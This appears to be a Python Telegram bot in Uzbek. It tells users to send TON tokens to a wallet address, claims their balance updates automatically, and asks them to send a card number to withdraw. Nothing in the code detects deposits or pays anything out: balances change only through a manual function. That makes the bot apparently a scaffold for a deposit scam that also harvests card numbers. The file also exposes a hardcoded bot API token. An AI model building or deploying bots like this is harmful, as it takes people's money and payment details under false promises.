import telebot
from telebot import types

API_TOKEN = '7251858052:AAFIYXu8v45VQySeDj-F1hrjMty_mOQ-ApM'
bot = telebot.TeleBot(API_TOKEN)

user_balances = {}

address_response = """
Tangalaringizni adresga tashlang:
<pre>YOUR_WALLET_ADDRESS</pre>

Pul avtomotik ravishda Balans💰ga tushadi
"""


@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    address_btn = types.KeyboardButton('Adres 📥')
    balance_btn = types.KeyboardButton('Balans 💰')
    withdrawal_btn = types.KeyboardButton('Pul yechish 📤')
    help_btn = types.KeyboardButton('Savollar FAQ 🛠')
    sprt_btn = types.KeyboardButton('Yordam 👮‍♂️')
    markup.add(address_btn, balance_btn, withdrawal_btn, help_btn, sprt_btn)
    bot.send_message(message.chat.id, address_response, reply_markup=markup)

@bot.message_handler(func=lambda message: True)
def echo_all(message):
    if message.text == 'Adres 📥':
        bot.send_message(message.chat.id, address_response, parse_mode='HTML')
    elif message.text == 'Balans 💰':
        user_id = message.from_user.id
        balance = user_balances.get(user_id, 0)
        bot.send_message(message.chat.id, f"Sizning balansingiz: {balance} UZS")
    elif message.text == 'Savollar FAQ 🛠':
        bot.send_message(message.chat.id, "TON jettons barlarini ko'rsatilgan manzilga yuboring. Balansingiz avtomatik ravishda yangilanadi.")
    elif message.text == 'Yordam 👮‍♂️':
        bot.send_message(message.chat.id, "Write some questions to support center @support")
    elif message.text == 'Pul yechish 📤':
        bot.send_message(message.chat.id, "To Withdrawal send card number")
    else:
        bot.send_message(message.chat.id, "Invalid option. Please choose from Address, Balance, or Help.")

def notify_user(user_id, amount):
    user_balances[user_id] = user_balances.get(user_id, 0) + amount
    bot.send_message(user_id, f"Siz balansingizga {amount} UZS miqdorida pul oldingiz. Sizning yengi balansingiz {user_balances[user_id]} UZS")

# notify_user(123456789, 1000)

bot.polling()

# 1=6, 2=9, 3=5, 4=2, 5=0, 6=8, 7=1, 8=7, 9=4, 0=3



